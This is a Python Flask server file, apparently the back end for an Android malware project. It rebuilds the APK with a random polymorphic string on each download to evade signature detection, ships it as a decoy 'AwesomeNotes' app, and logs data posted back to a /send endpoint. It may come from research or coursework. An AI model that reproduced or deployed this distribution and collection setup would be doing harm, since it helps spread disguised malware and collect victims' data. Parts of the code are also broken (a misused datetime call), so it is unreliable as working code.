import datetime
from flask import Flask, redirect, url_for, request, send_file
import subprocess
import re
import random
import string

RANDOM_LENGTH = 40
APP_SOURCE_DIRECTORY = '../src/main/java/'
POLYMORPHIC_CLASS = 'com/example/malwareapp/Startup.java'
INTEGRITY_BUILD_SCRIPT = './build.sh'
APK_DIRECTORY = '../build/outputs/apk/release/'
DEFAULT_APK_NAME = 'app-release.apk'
NEW_APK_NAME = 'AwesomeNotes.apk'

app = Flask(__name__)
app.secret_key = "waremal"

def execute_command(command):
    subprocess.Popen(command, shell = True, stdout = subprocess.PIPE).stdout.read()

def polymorphic_transform(polymorphic_class):
    with open(polymorphic_class, 'r') as file:
        code = file.read()
        random_string = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for _ in range(RANDOM_LENGTH))
        modified_code = re.sub('RAND[a-zA-Z0-9]{' + str(RANDOM_LENGTH) + '}RAND', 'RAND' + random_string + 'RAND', code)
        file.close()

    with open(polymorphic_class, 'w') as file:
        file.write(modified_code)

@app.route("/")
def root():
    return redirect(url_for('alive'))

@app.route("/alive", methods=["GET"])
def is_alive():
    return { "message": "I'm alive" }, 200

@app.route("/download", methods=["GET"])
def download_release():
    polymorphic_transform(APP_SOURCE_DIRECTORY + POLYMORPHIC_CLASS)
    execute_command('../../build.sh http://' + request.remote_addr + ":5000/")
    execute_command('cp ' + APK_DIRECTORY + DEFAULT_APK_NAME + ' ' + APK_DIRECTORY + NEW_APK_NAME)

    return send_file(APK_DIRECTORY + NEW_APK_NAME, as_attachment=True)

@app.route("/send", methods=["POST"])
def send_data():
    msg = request.form["test"]
    sender = request.remote_addr

    log_msg = "{}[{}]: -> {}\n".format(datetime.now().strftime("%d/%m/%Y %H:%M:%S"), sender, msg)

    print(log_msg)

    with open("log.txt", "a") as f:
        f.write(log_msg)

    return "<p>example</p>", 200

if __name__=="__main__":
    app.run(host='0.0.0.0', debug=True, ssl_context=('server.crt', 'server.key'))
    # app.run(host='0.0.0.0', debug=True, ssl_context='adhoc')
